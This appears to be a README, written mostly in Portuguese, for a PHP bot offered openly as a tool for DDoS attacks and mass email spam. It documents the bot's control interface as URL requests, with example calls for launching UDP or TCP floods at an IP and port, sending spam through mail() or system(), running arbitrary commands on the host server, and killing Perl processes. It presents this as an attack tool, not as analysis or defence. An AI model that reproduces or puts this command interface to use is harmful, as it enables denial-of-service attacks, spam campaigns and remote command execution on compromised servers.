# PHP Bot (DDoS/Spam)

Bot em PHP utilizado para enviar emails em massa e realizar ataques DDoS (Negação de Serviço).

###Functions...
 DDos, Spam (Perl e PHP), Run command, Kill Perl running.

###Functions details...
 - DDoS:
        command = ddos.
        flag = Attack method: udp, tcp.
        data = IP:PORT.

        phpBot.php?hash=admin&command=ddos&flag=udp&data=111.111.111.111:22

 - Spam:
 
        command = spam, phpspam (spam via mail() function).
        flag = 1 é padrão para spam normal. 
              Para phpspam, 1 = Usa função system() para rodar enviador, 
              2 = Utiliza todas as funções (Envia repetido).
        data = null (default).

        POST data:
          maillist=...&subject=...&from=...&message=...
         
          phpBot.php?hash=admin&command=spam&flag=1&data=null

 - Run file:
 
          command = run.
          flag = 1 (default).
          data = Command to run

          phpBot.php?hash=admin&command=run&flag=1&data=dir.exe

 - Kill dependencies:
 
          command = kill.
          flag = 1 (default).
          data = null (default)

          phpBot.php?hash=admin&command=kill&flag=1&data=null

